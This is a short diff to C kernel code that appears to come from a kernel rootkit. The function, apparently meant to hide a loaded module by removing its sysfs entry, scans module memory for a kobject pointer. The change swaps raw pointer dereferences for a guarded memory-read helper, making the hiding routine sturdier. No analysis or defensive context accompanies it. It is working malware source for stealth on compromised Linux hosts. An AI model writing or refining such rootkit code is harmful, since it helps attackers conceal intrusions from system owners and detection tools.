@@ -94,10 +94,14 @@ void neverc_krt_mod_sysfs_remove(struct neverc_krt_hide_state *state,
 	unsigned char *base = (unsigned char *)mod;
 	unsigned long i;
 	for (i = kobj_off; i < kobj_off + 256; i += 8) {
-		unsigned long v = *(unsigned long *)(base + i);
+		unsigned long v;
+		if (neverc_krt_mem_read(&v, base + i, 8))
+			continue;
 		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
-			unsigned long *pp = (unsigned long *)v;
-			if (*pp > 0xFFFF000000000000UL) {
+			unsigned long pp_val;
+			if (neverc_krt_mem_read(&pp_val, (void *)v, 8))
+				continue;
+			if (pp_val > 0xFFFF000000000000UL) {
 				mkobj = (void *)v;
 				break;
 			}
